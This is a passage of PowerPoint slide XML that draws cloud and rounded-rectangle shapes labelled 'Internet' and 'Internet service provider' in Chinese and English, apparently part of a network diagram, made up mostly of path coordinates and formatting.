                    <a:lnTo>
                      <a:pt x="22" y="154"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="22" y="164"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="22" y="176"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="24" y="188"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="26" y="200"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="29" y="211"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="222"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="38" y="232"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="242"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="29" y="252"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="25" y="262"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="273"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="18" y="283"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="16" y="294"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="305"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="12" y="316"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="10" y="327"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="9" y="338"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="9" y="350"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="9" y="361"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="10" y="372"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="12" y="382"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7" y="393"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="405"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2" y="417"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="429"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="441"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="451"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="461"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="470"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5" y="479"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7" y="488"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="10" y="497"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="14" y="506"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="18" y="514"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="23" y="522"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="27" y="529"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="537"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="39" y="544"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="550"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="52" y="557"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="59" y="563"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="66" y="568"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="74" y="573"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="82" y="578"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="582"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="99" y="585"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="107" y="588"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="116" y="591"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="126" y="593"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="135" y="595"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="145" y="596"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="154" y="596"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="165" y="595"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="176" y="594"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="186" y="593"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="197" y="596"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="208" y="599"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="219" y="601"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="230" y="603"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="242" y="604"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="253" y="605"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="265" y="605"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="278" y="605"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="290" y="604"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="303" y="603"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="315" y="601"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="327" y="598"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="338" y="595"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="350" y="591"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="358" y="597"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="367" y="603"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="375" y="608"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="384" y="613"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="393" y="617"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="403" y="622"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="412" y="626"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="422" y="629"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="432" y="632"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="442" y="635"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="452" y="638"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="462" y="640"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="473" y="641"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="483" y="642"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="494" y="643"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="505" y="643"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="516" y="643"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="527" y="642"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="538" y="641"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="549" y="639"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="560" y="637"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="570" y="635"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="581" y="632"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="591" y="628"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="601" y="625"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="611" y="621"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="620" y="616"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="629" y="611"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="638" y="606"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="647" y="600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="656" y="594"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="664" y="588"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="675" y="592"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="686" y="595"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="698" y="598"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="709" y="601"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="721" y="603"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="733" y="604"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="745" y="605"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="758" y="605"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="769" y="605"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="781" y="604"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="792" y="603"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="803" y="601"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="814" y="599"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="825" y="596"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="836" y="593"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="846" y="589"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="857" y="585"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="867" y="581"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="876" y="576"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="886" y="571"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="895" y="576"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="904" y="581"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="914" y="586"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="924" y="590"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="934" y="594"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="944" y="597"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="954" y="600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="965" y="603"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="975" y="605"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="986" y="606"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="997" y="607"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1009" y="608"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1020" y="608"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1031" y="608"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1043" y="607"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1054" y="606"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1065" y="611"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1075" y="614"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1086" y="617"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1098" y="619"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1109" y="621"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1121" y="621"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1130" y="621"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1140" y="620"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1150" y="618"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1159" y="616"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1168" y="614"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1177" y="611"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1185" y="607"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1194" y="603"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1202" y="598"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1209" y="593"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1216" y="588"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1224" y="582"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1230" y="576"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1236" y="569"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1242" y="562"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1248" y="555"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1253" y="547"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1258" y="539"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1262" y="531"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1265" y="522"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1268" y="514"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1271" y="505"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1273" y="495"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1274" y="486"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1275" y="476"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1275" y="467"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1275" y="454"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1273" y="441"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1271" y="429"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1267" y="417"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1270" y="405"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1273" y="392"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1274" y="379"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1275" y="366"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1275" y="353"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1275" y="341"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1274" y="329"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1273" y="317"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1271" y="305"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1269" y="293"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1265" y="282"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1262" y="271"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1258" y="260"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1253" y="249"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="99CCFF"/>
              </a:solidFill>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:extLst>
                <a:ext uri="{91240B29-F687-4F45-9708-019B960494DF}">
                  <a14:hiddenLine xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" w="19050">
                    <a:solidFill>
                      <a:srgbClr val="000000"/>
                    </a:solidFill>
                    <a:round/>
                    <a:headEnd/>
                    <a:tailEnd/>
                  </a14:hiddenLine>
                </a:ext>
              </a:extLst>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98387" name="Text Box 203"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="4026" y="1501"/>
                <a:ext cx="672"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1600" b="1"/>
                  <a:t>公网</a:t>
                </a:r>
              </a:p>
              <a:p>
                <a:pPr algn="ctr"/>
                <a:r>
                  <a:rPr lang="en-US" altLang="en-US" sz="1600" b="1"/>
                  <a:t>(Internet)</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98376" name="AutoShape 204"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3548" y="2150"/>
              <a:ext cx="1562" cy="203"/>
            </a:xfrm>
            <a:prstGeom prst="roundRect">
              <a:avLst>
                <a:gd name="adj" fmla="val 50000"/>
              </a:avLst>
            </a:pr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wrap="none" lIns="45720" rIns="45720" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1"/>
                <a:t>Internet </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1"/>
                <a:t>服务供应商</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="en-US" sz="1400" b="1"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98377" name="Freeform 205"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1729" y="1644"/>
              <a:ext cx="455" cy="374"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 74843985 w 283"/>
                <a:gd name="T1" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T2" fmla="*/ 71316632 w 283"/>
                <a:gd name="T3" fmla="*/ 1505851567 h 191"/>
                <a:gd name="T4" fmla="*/ 67367763 w 283"/>
                <a:gd name="T5" fmla="*/ 969624266 h 191"/>
                <a:gd name="T6" fmla="*/ 62830075 w 283"/>
                <a:gd name="T7" fmla="*/ 536220814 h 191"/>
                <a:gd name="T8" fmla="*/ 57948853 w 283"/>
                <a:gd name="T9" fmla="*/ 231415416 h 191"/>
                <a:gd name="T10" fmla="*/ 53429668 w 283"/>
                <a:gd name="T11" fmla="*/ 0 h 191"/>
                <a:gd name="T12" fmla="*/ 48483316 w 283"/>
                <a:gd name="T13" fmla="*/ 0 h 191"/>
                <a:gd name="T14" fmla="*/ 43619392 w 283"/>
                <a:gd name="T15" fmla="*/ 81707760 h 191"/>
                <a:gd name="T16" fmla="*/ 38357876 w 283"/>
                <a:gd name="T17" fmla="*/ 313285124 h 191"/>
                <a:gd name="T18" fmla="*/ 34101033 w 283"/>
                <a:gd name="T19" fmla="*/ 769031148 h 191"/>
                <a:gd name="T20" fmla="*/ 29892883 w 283"/>
                <a:gd name="T21" fmla="*/ 1201202544 h 191"/>
                <a:gd name="T22" fmla="*/ 26061668 w 283"/>
                <a:gd name="T23" fmla="*/ 1813383633 h 191"/>
                <a:gd name="T24" fmla="*/ 22589039 w 283"/>
                <a:gd name="T25" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T26" fmla="*/ 17687529 w 283"/>
                <a:gd name="T27" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T28" fmla="*/ 13319406 w 283"/>
                <a:gd name="T29" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T30" fmla="*/ 9187783 w 283"/>
                <a:gd name="T31" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T32" fmla="*/ 6022202 w 283"/>
                <a:gd name="T33" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T34" fmla="*/ 3280458 w 283"/>
                <a:gd name="T35" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T36" fmla="*/ 1449040 w 283"/>
                <a:gd name="T37" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T38" fmla="*/ 453034 w 283"/>
                <a:gd name="T39" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T40" fmla="*/ 0 w 283"/>
                <a:gd name="T41" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T42" fmla="*/ 453034 w 283"/>
                <a:gd name="T43" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T44" fmla="*/ 1449040 w 283"/>
                <a:gd name="T45" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T46" fmla="*/ 4196045 w 283"/>
                <a:gd name="T47" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T48" fmla="*/ 7128204 w 283"/>
                <a:gd name="T49" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T50" fmla="*/ 10361453 w 283"/>
                <a:gd name="T51" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T52" fmla="*/ 14379804 w 283"/>
                <a:gd name="T53" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T54" fmla="*/ 18863773 w 283"/>
                <a:gd name="T55" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T56" fmla="*/ 23749838 w 283"/>
                <a:gd name="T57" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T58" fmla="*/ 28037494 w 283"/>
                <a:gd name="T59" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T60" fmla="*/ 31777771 w 283"/>
                <a:gd name="T61" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T62" fmla="*/ 35524654 w 283"/>
                <a:gd name="T63" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T64" fmla="*/ 39600986 w 283"/>
                <a:gd name="T65" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T66" fmla="*/ 43964283 w 283"/>
                <a:gd name="T67" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T68" fmla="*/ 48761660 w 283"/>
                <a:gd name="T69" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T70" fmla="*/ 54114927 w 283"/>
                <a:gd name="T71" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T72" fmla="*/ 58913349 w 283"/>
                <a:gd name="T73" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T74" fmla="*/ 63669430 w 283"/>
                <a:gd name="T75" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T76" fmla="*/ 68425964 w 283"/>
                <a:gd name="T77" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T78" fmla="*/ 72964845 w 283"/>
                <a:gd name="T79" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T80" fmla="*/ 76853854 w 283"/>
                <a:gd name="T81" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T82" fmla="*/ 80543799 w 283"/>
                <a:gd name="T83" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T84" fmla="*/ 84768563 w 283"/>
                <a:gd name="T85" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T86" fmla="*/ 88998854 w 283"/>
                <a:gd name="T87" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T88" fmla="*/ 93538787 w 283"/>
                <a:gd name="T89" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T90" fmla="*/ 96822601 w 283"/>
                <a:gd name="T91" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T92" fmla="*/ 99850211 w 283"/>
                <a:gd name="T93" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T94" fmla="*/ 102190778 w 283"/>
                <a:gd name="T95" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T96" fmla="*/ 103391856 w 283"/>
                <a:gd name="T97" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T98" fmla="*/ 104750359 w 283"/>
                <a:gd name="T99" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T100" fmla="*/ 104750359 w 283"/>
                <a:gd name="T101" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T102" fmla="*/ 104017180 w 283"/>
                <a:gd name="T103" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T104" fmla="*/ 102190778 w 283"/>
                <a:gd name="T105" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T106" fmla="*/ 99152684 w 283"/>
                <a:gd name="T107" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T108" fmla="*/ 95745714 w 283"/>
                <a:gd name="T109" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T110" fmla="*/ 91998391 w 283"/>
                <a:gd name="T111" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T112" fmla="*/ 88149013 w 283"/>
                <a:gd name="T113" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T114" fmla="*/ 83327806 w 283"/>
                <a:gd name="T115" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T116" fmla="*/ 78677534 w 283"/>
                <a:gd name="T117" fmla="*/ 2147483647 h 19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83"/>
                <a:gd name="T178" fmla="*/ 0 h 191"/>
                <a:gd name="T179" fmla="*/ 283 w 283"/>
                <a:gd name="T180" fmla="*/ 191 h 191"/>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83" h="191">
                  <a:moveTo>
                    <a:pt x="212" y="33"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="210" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="208" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="207" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="206" y="32"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="205" y="31"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="204" y="30"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="203" y="29"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="202" y="29"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="201" y="28"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="201" y="27"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="200" y="26"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="199" y="25"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198" y="24"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="197" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="196" y="22"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="195" y="21"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="194" y="21"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="193" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="192" y="19"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="191" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="190" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="188" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="187" y="16"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="186" y="15"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="185" y="15"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="183" y="13"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="182" y="13"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="181" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="180" y="11"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="178" y="11"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="177" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="176" y="9"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="175" y="9"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="174" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="172" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="171" y="7"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="170" y="7"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="168" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="166" y="5"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="165" y="5"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="164" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="162" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="161" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="160" y="3"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="159" y="3"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="157" y="3"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="155" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="153" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="152" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="151" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="149" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
